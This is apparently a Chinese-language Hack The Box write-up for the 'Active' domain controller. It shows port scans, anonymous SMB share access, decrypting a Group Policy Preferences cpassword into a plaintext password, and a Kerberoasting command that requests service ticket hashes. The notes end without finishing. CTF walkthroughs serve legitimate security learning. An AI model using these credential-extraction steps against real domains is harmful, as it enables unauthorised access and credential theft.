# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测

查看开启端口服务
```
┌──(root💀kali)-[~/htb/Active]
└─# nmap -p- 10.10.10.100 --open
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-29 04:33 EST
Nmap scan report for 10.10.10.100
Host is up (0.30s latency).
Not shown: 65508 closed ports, 4 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5722/tcp  open  msdfsr
9389/tcp  open  adws
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
49169/tcp open  unknown
49171/tcp open  unknown
49180/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 136.09 seconds

```

查看对应端口详细信息
```
┌──(root💀kali)-[~/htb/Active]
└─# nmap -sV -T4 -A -O -p 53,88,135,389,445,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49171,49180 10.10.10.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-29 04:37 EST
Nmap scan report for 10.10.10.100
Host is up (0.29s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-29 09:37:56Z)
135/tcp   open  msrpc         Microsoft Windows RPC
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49180/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 R2 SP1 (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -2s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-12-29T09:39:06
|_  start_date: 2021-12-29T09:31:20

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   283.07 ms 10.10.14.1
2   284.19 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.68 seconds

```

有活动目录还有DNS，那这台应该是DC服务器

先从samba开始，枚举共享目录
```
┌──(root💀kali)-[~/htb/Active]
└─# smbmap -u '' -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS


```

匿名账号只可以进入```Replication```
登录
```
──(root💀kali)-[~/htb/Active]
└─#  smbclient --no-pass //10.10.10.100/Replication                                                             1 ⨯
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

```

下载所有文件到本地待分析
```
smb: \> recurse on
smb: \> prompt off
smb: \>  mget *

```

```active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml ```爆出一个登录账号凭据
```
┌──(root💀kali)-[~/…/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups]
└─# cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```

用户名：```active.htb\SVC_TGS```
哈希：```edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ```


在谷歌搜索```Groups.xml decrypt```找到这个文件的解密方法:```gpp-decrypt```

```
┌──(root💀kali)-[~/htb/Active]
└─# gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

GPPstillStandingStrong2k18

```

解出密码为：```GPPstillStandingStrong2k18```

使用下面命令登录Users文件夹

> smbclient -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18' //10.10.10.100/Users


找到user.txt
```
smb: \SVC_TGS\Desktop\> pwd
Current directory is \\10.10.10.100\Users\SVC_TGS\Desktop\
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                            A       34  Sat Jul 21 11:06:25 2018

```


smbmap -u "active.htb/SVC_TGS" -p "GPPstillStandingStrong2k18" -H 10.10.10.100



python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -outputfile hashes.kerberoast


smbclient -U 'active.htb/SVC_TGS%GPPstillStandingStrong2k18' //10.10.10.100/SYSVOL